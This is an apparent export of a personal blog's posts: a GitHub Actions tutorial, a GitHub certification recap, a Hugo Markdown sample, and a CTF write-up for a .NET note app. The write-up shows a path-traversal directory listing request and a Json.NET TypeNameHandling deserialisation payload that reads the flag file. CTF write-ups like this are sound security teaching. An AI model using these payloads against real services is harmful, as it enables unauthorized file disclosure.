repository\u0026gt; Actions tab and enable Actions. Workflows A workflow uses the YAML syntax A workflow must have the following \u0026ldquo;root\u0026rdquo; keys 1 2 3 4 on: # identifies the events that trigger this workflow jobs: # identifies the jobs to run Events that trigger workflows There are many events that can trigger workflows. A few common ones: push: When a commit is pushed to GitHub pull_request: When a pull request is created (Before it is merged) workflow_dispatch: Manual trigger (Gives you a button to trigger said workflow) repository_dispatch: Trigger due to events outside the repo (Very interesting, this one) To add an event trigger, add it under on 1 2 3 4 5 6 7 8 on: push # works for single event trigger on: [push, pull_request] # multiple events # more granular event trigger on: push: branches: [main] pull_request: branches: [main] In our example, let\u0026rsquo;s say we want to define 4 event triggers. 1 2 3 4 5 6 7 8 9 10 on: push: branches: [\u0026#39;main\u0026#39;] pull_request: # trigger when pr is created to main branch branches: [\u0026#39;main\u0026#39;] workflow_dispatch: # manual trigger repository_dispatch: # trigger via outside events jobs: # identifies the jobs to run Jobs We can define multiple jobs that run during a workflow Each job is run inside its own independent container. Each job can has multiple steps (that run in the same container) Compulsory options in a job are runs-on: Runs on a certain kind of container. There are 3 options on GitHub: Ubuntu-latest MacOS-latest Windows-latest steps: Define the steps in an action There are two \u0026ldquo;kinds\u0026rdquo; of steps. Different keyword is used for both of them. Steps that run GitHub Actions: uses Steps that run commands on the container: run Let\u0026rsquo;s define a job with one step: Greeting the user. 1 2 3 4 5 6 7 8 9 # snip jobs: test: # name of job (can be \u0026#34;job1\u0026#34; etc) runs-on: ubuntu-latest # use linux machine steps: - name: \u0026#34;Hello World\u0026#34; # not compulsory but aids in debugging # use run to execute commands in the container run: echo \u0026#34;Hello $GITHUB_ACTOR, happy learning!\u0026#34; Output: 7. That is cool, but let\u0026rsquo;s clone our repository in the container so that we can examine the code inside. For this, we will use a pre-made action: actions/checkout\n1 2 3 4 5 6 7 8 9 jobs: test: runs-on: ubuntu-latest steps: - name: \u0026#34;Hello World\u0026#34; run: echo \u0026#34;Hello $GITHUB_ACTOR, happy learning!\u0026#34; - name: \u0026#34;Import Repository\u0026#34; # \u0026#34;uses\u0026#34; keyword allows us to use a github action uses: actions/checkout@v4 Learnt the fact that the container does not contain the repo the hard way lol Next, we will execute the Python test code 1 2 3 4 5 6 7 8 9 10 11 jobs: test: runs-on: ubuntu-latest steps: - name: \u0026#34;Hello World\u0026#34; run: echo \u0026#34;Hello $GITHUB_ACTOR, happy learning!\u0026#34; - name: \u0026#34;Import Repository\u0026#34; uses: actions/checkout@v4 - name: \u0026#34;Run Unit Test\u0026#34; # we can run multiline commands like this run: python -m unittest Just for fun, this is how you run a multiline step 1 2 3 4 5 6 7 8 9 10 11 12 13 jobs: test: runs-on: ubuntu-latest steps: - name: \u0026#34;Hello World\u0026#34; run: echo \u0026#34;Hello $GITHUB_ACTOR, happy learning!\u0026#34; - name: \u0026#34;Import Repository\u0026#34; uses: actions/checkout@v4 - name: \u0026#34;Run Unit Test\u0026#34; # we can run multiline commands like this run: | ls -la python -m unittest Output: Other Workflow Triggers There are two unique workflow triggers that we defined, workflow dispatch and repository dispatch. Let\u0026rsquo;s see how to trigger them. To trigger workflow_dispatch, navigate to your GitHub Repo \u0026gt; Actions Tab \u0026gt; Click \u0026ldquo;Python Test\u0026rdquo; on the left sidebar. Click on \u0026ldquo;Run workflow\u0026rdquo; to trigger the workflow. To trigger repository_dispatch, you need to send a post request to a github endpoint. First, create a fine-tuned access token. Go to account settings\u0026gt; Developer Settings \u0026gt; PAT \u0026gt; Fine-grained tokens and press Generate New Token The fine-grained token must have the following permission set: \u0026ldquo;Contents\u0026rdquo; repository permissions (read and write) Send a HTTP request to the relevant endpoint. 1 2 3 4 5 6 7 curl -L \\ -X POST \\ -H \u0026#34;Accept: application/vnd.github+json\u0026#34; \\ -H \u0026#34;Authorization: Bearer github_pat_..\u0026lt;snip\u0026gt;..\u0026#34; \\ -H \u0026#34;X-GitHub-Api-Version: 2022-11-28\u0026#34; \\ https://api.github.com/repos/\u0026lt;accName\u0026gt;/\u0026lt;repo-name\u0026gt;/dispatches \\ -d \u0026#39;{\u0026#34;event_type\u0026#34;:\u0026#34;my_input\u0026#34;,\u0026#34;client_payload\u0026#34;:{}\u0026#39; Output: \u0026ldquo;Repository dispatch triggered\u0026rdquo; Conclusion This is a very simple example of a continuous integration workflow using GitHub. Automated workflows are quite powerful as it frees developers from mundane testing tasks and in terms of security, encourage a shift left in security. Further reading: GitHub Workflow Syntax: https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions ","date":"2025-07-12T23:21:25Z","permalink":"https://trinuro.github.io/p/github-actions-primer-workflows-for-continuous-integration/","title":"GitHub Actions Primer - Workflows for Continuous Integration"},{"content":"\nLast month, I completed 3 certifications from GitHub, namely Foundations, Actions and Advanced Security. It was not in my plan, but since I received 2 free vouchers and a 60% off voucher, I figured, why not lol. Let me give you a quick run down of what I learnt and some tips for the exam.\nWhat I learnt (The useful ones anyways) GitHub Foundations Codespaces: Codespaces is a container allocated for a repository. You can edit your repository code, push commits, run and test the code etc. It is very useful if you want to test your code on the go. It uses the VS code interface. Web Editor: It is basically codespaces but you can only run and edit files, no code execution. It does not incur charges from GitHub. I usually use this nowadays. Shortcut to use the editor: change https://github.com/trinuro/actions-learning-pathway to https://github.dev/trinuro/actions-learning-pathway .devcontainer/devcontainer.json: This file is used to configure the environment of codespaces. For example, install Golang in the container GitHub Actions Workflows: Workflow is the file to define automatic operations in a repository. You must define the events that trigger the workflow (eg a push commit) and the jobs that it will execute if said event is triggered. Use this for CI/CD. Custom GitHub Actions: You can define your own GitHub actions to be reused in multiple workflows. Just remember to define a actions.yml in the root directory. Reusable workflows: This is different from GitHub Actions in the sense that GH actions is used as a step in a job while reusable workflow is used as job GitHub Secret: Use this to store secrets for your workflows. Don\u0026rsquo;t hardcode it. GitHub Advanced Security: Code scanning: Identifies logical vulnerabilities in repository code, eg. SQL Injection Secret scanning: Identifies exposed secrets in repository code, issues, pull requests etc, eg API tokens Push protection: Identifies exposed secrets before it is committed Dependabot: Identifies vulnerable dependencies in the repo Dependabot Security Update: Automatically create pull request when vulnerable dependency is detected Tips for the exam Go through the exam syllabus. Make sure you can answer each point in the syllabus Do labs! Go through GitHub Learning Pathways for initial exposure Go through MS Learn on GitHub for labs Try out the practice tests on GHCertified. It is not one-to-one with the exam questions but I think it is good enough. It shows you which documentation to read which is good. Read them all. Final Thoughts Out of the three, I learnt/struggled the most from the GitHub Actions certification. However, I would definitely encourage the reader to go through the GitHub Actions cert before attempting GitHub Advanced Security (GHAS) as GHAS builds on the knowledge on GitHub Actions.\nGood luck and happy learning. Cert collector out.\n","date":"2025-07-05T23:43:29Z","permalink":"https://trinuro.github.io/p/got-my-first-github-certification/","title":"Got my first GitHub Certification!"},{"content":"Welcome to NoteSafe, the ultra-secure note-taking app that protected by \u0026ldquo;Bitcoin-style encryption\u0026rdquo;™. Store your deepest thoughts and sensitive files behind a digital vault crafted by developers who read just enough of the Bitcoin whitepaper to feel dangerous.\nBut how safe is NoteSafe, really?\nCan you bypass the crypto-hype, dig through the interface, and uncover what they\u0026rsquo;ve desperately tried to hide? A flag waits for the one who can see through the buzzwords and break the illusion of security.\nWriteup There are many dotnet DLL files. We can use JetBrain\u0026rsquo;s dotPeek to disassemble them. There is an interesting code in NoteSafe.Services.DatabaseService 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 private async Task SeedDatabaseAsync() { try { if (!await this.CheckTableExistsAsync(\u0026#34;Users\u0026#34;)) LoggerExtensions.LogWarning((ILogger) this._logger, \u0026#34;Users table does not exist, cannot seed database.\u0026#34;, Array.Empty\u0026lt;object\u0026gt;()); else if (await this._context.Users.CountAsync\u0026lt;User\u0026gt;() \u0026gt; 0) { LoggerExtensions.LogInformation((ILogger) this._logger, \u0026#34;Database already has users, skipping seed.\u0026#34;, Array.Empty\u0026lt;object\u0026gt;()); } else { User adminUser = new User() { Username = \u0026#34;admin\u0026#34;, PasswordHash = \u0026#34;240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9\u0026#34;, CreatedAt = DateTime.UtcNow }; this._context.Users.Add(adminUser); int num1 = await this._context.SaveChangesAsync(); LoggerExtensions.LogInformation((ILogger) this._logger, \u0026#34;Added admin user to database.\u0026#34;, Array.Empty\u0026lt;object\u0026gt;()); this._context.Notes.Add(new Note() { Title = \u0026#34;Secret Flag\u0026#34;, Content = \u0026#34;FLAG{this_flag_is_not_the_flag}\u0026#34;, CreatedAt = DateTime.UtcNow, UpdatedAt = DateTime.UtcNow, UserId = adminUser.Id }); int num2 = await this._context.SaveChangesAsync(); LoggerExtensions.LogInformation((ILogger) this._logger, \u0026#34;Added flag note to database.\u0026#34;, Array.Empty\u0026lt;object\u0026gt;()); adminUser = (User) null; } } catch (Exception ex) { LoggerExtensions.LogError((ILogger) this._logger, ex, \u0026#34;Error seeding database.\u0026#34;, Array.Empty\u0026lt;object\u0026gt;()); throw; } } The password is admin123 Let\u0026rsquo;s log in as admin:admin123 Alright we are in The flag does not work We can get directory listing like this: 1 GET /api/Files/list?folder=../../ HTTP/1.1 Note: It is most probably an insecure deserialisation problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 public async Task\u0026lt;Note\u0026gt; CreateNoteAsync(string jsonPayload, int userId) { Note noteAsync; try { try { Note note = JsonConvert.DeserializeObject\u0026lt;Note\u0026gt;(jsonPayload); if (note != null) { note.UserId = userId; note.CreatedAt = DateTime.UtcNow; note.UpdatedAt = DateTime.UtcNow; this._context.Notes.Add(note); int num = await this._context.SaveChangesAsync(); noteAsync = note; goto label_15; } note = (Note) null; } catch { } object obj1 = JsonHelper.DeserializeObject\u0026lt;object\u0026gt;(jsonPayload); PropertyInfo[] properties = obj1.GetType().GetProperties(); Dictionary\u0026lt;string, object\u0026gt; dictionary = new Dictionary\u0026lt;string, object\u0026gt;(); foreach (PropertyInfo propertyInfo in properties) { try { object obj2 = propertyInfo.GetValue(obj1); // creating the object dictionary[((MemberInfo) propertyInfo).Name] = obj2; } catch { dictionary[((MemberInfo) propertyInfo).Name] = (object) \u0026#34;[Error reading property]\u0026#34;; } } throw new InvalidOperationException(\u0026#34;Invalid object type. Debug info: \u0026#34; + JsonConvert.SerializeObject((object) dictionary)); // we want to trigger this } catch (Exception ex) { throw; } label_15: return noteAsync; // we dont want this } Reason for the vulnerability: JsonHelper.DeserializeObject\u0026lt;object\u0026gt;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public static T DeserializeObject\u0026lt;T\u0026gt;(string json) { try { JsonSerializerSettings settings = new JsonSerializerSettings() { TypeNameHandling = TypeNameHandling.All, SerializationBinder = (ISerializationBinder) null, TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full, ConstructorHandling = ConstructorHandling.AllowNonPublicDefaultConstructor, PreserveReferencesHandling = PreserveReferencesHandling.Objects, MetadataPropertyHandling = MetadataPropertyHandling.ReadAhead }; return JsonConvert.DeserializeObject\u0026lt;T\u0026gt;(json, settings); } catch { throw; } } T can be only object, so we can deserialize any object we want. Our JSON payload: First, We identify our gadget: In this case, our gadget is FileSystemService object as it will read file and store it as an instance variable 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 public class FileSystemService { public string FilePath { get; set; } // we can set FilePath public FileSystemService() { } public FileSystemService(string filePath) =\u0026gt; this.FilePath = filePath; public string ReadFileAsString(string path = null) { string str = path ?? this.FilePath; if (string.IsNullOrEmpty(str)) return (string) null; try { return File.Exists(str) ? File.ReadAllText(str) : (string) null; } catch (Exception ex) { return (string) null; } } public string FileContents // file contents is leaked here { get =\u0026gt; this.ReadFileAsString(); set { } } \u0026lt;snip\u0026gt; } We need to get information about the assembly and type from dotPeek\n1 2 3 4 5 // Decompiled with JetBrains decompiler // Type: NoteSafe.Services.FileSystemService // Assembly: NoteSafe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null // MVID: 50FA2D5F-03F2-4E88-B45C-760E5B77FEB8 // Assembly location: C:\\Users\\Khiew\\Downloads\\NoteSafe\\NoteSafe\\FOR_PLAYER\\NoteSafe\\NoteSafe\\NoteSafe.dll To build our payload,\n1 {\u0026#34;$type\u0026#34;: \u0026#34;NoteSafe.Services.FileSystemService, NoteSafe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\u0026#34;,\u0026#34;FilePath\u0026#34;: \u0026#34;../../../flag.txt\u0026#34;} Output:\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 400 Bad Request Content-Type: text/plain; charset=utf-8 Date: Fri, 27 Jun 2025 23:43:28 GMT Server: Kestrel Content-Length: 127 Invalid object type. Debug info: {\u0026#34;FilePath\u0026#34;:\u0026#34;../../flag-hLS1iTUpUV.txt\u0026#34;,\u0026#34;FileContents\u0026#34;:\u0026#34;flag{fake_flag}\u0026#34;} However, this will not work in remote. This is because the organizer changed the name of the flag file. To find the new name, list the directory with the endpoint previously 1 GET /api/Files/list?folder=../../ HTTP/1.1 Output:\n1 {\u0026#34;currentPath\u0026#34;:\u0026#34;/app/../../\u0026#34;,\u0026#34;files\u0026#34;:[{\u0026#34;name\u0026#34;:\u0026#34;flag-hLS1iTUpUV.txt\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;/app/../../flag-hLS1iTUpUV.txt\u0026#34;,\u0026#34;size\u0026#34;:36,\u0026#34;lastModified\u0026#34;:\u0026#34;2025-06-19T20:56:28.7842621+00:00\u0026#34;},{\u0026#34;name\u0026#34;:\u0026#34;.dockerenv\u0026#34;,\u0026#34;path\u0026#34;:\u0026#34;/app/../../.dockerenv\u0026#34;,\u0026#34;size\u0026#34;:0,\u0026#34;lastModified\u0026#34;:\u0026#34;2025-06-27T23:38:41.8432009+00:00\u0026#34;}], \u0026lt;snip\u0026gt;} The path is /app/../../flag-hLS1iTUpUV.txt To get the flag, 1 2 POST /api/Notes HTTP/1.1 {\u0026#34;$type\u0026#34;: \u0026#34;NoteSafe.Services.FileSystemService, NoteSafe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null\u0026#34;,\u0026#34;FilePath\u0026#34;: \u0026#34;../../flag-hLS1iTUpUV.txt\u0026#34;} Output:\n1 Invalid object type. Debug info: {\u0026#34;FilePath\u0026#34;:\u0026#34;../../flag-hLS1iTUpUV.txt\u0026#34;,\u0026#34;FileContents\u0026#34;:\u0026#34;prelim{buzzw0rd5_4r3_n0t_3ncrypt10n}\u0026#34;} ","date":"2025-07-02T23:48:26Z","permalink":"https://trinuro.github.io/p/notesafe/","title":"Notesafe"},{"content":"123\n","date":"2025-07-02T23:45:34Z","permalink":"https://trinuro.github.io/p/my-first-post/","title":"My First Post"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution Tiam, ad mint andaepu dandae nostion secatur sequo quae. Note that you can use Markdown syntax within a blockquote.\nBlockquote with attribution Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\nTables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\nName Age Bob 27 Alice 23 Inline Markdown within tables Italics Bold Code italics bold code A B C D E F Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus ultricies, sapien non euismod aliquam, dui ligula tincidunt odio, at accumsan nulla sapien eget ex. Proin eleifend dictum ipsum, non euismod ipsum pulvinar et. Vivamus sollicitudin, quam in pulvinar aliquam, metus elit pretium purus Proin sit amet velit nec enim imperdiet vehicula. Ut bibendum vestibulum quam, eu egestas turpis gravida nec Sed scelerisque nec turpis vel viverra. Vivamus vitae pretium sapien Code Blocks Code block with backticks 1 2 3 4 5 6 7 8 9 10 \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Code block indented with four spaces \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;utf-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Diff code block 1 2 3 4 5 [dependencies.bevy] git = \u0026#34;https://github.com/bevyengine/bevy\u0026#34; rev = \u0026#34;11f52b8c72fc3a568e8bb4a4cd1f3eb025ac2e13\u0026#34; - features = [\u0026#34;dynamic\u0026#34;] + features = [\u0026#34;jpeg\u0026#34;, \u0026#34;dynamic\u0026#34;] One line code block 1 \u0026lt;p\u0026gt;A paragraph\u0026lt;/p\u0026gt; List Types Ordered List First item Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL + ALT + Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nThe above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2023-09-07T00:00:00Z","permalink":"https://trinuro.github.io/p/markdown-syntax-guide/","title":"Markdown Syntax Guide"}]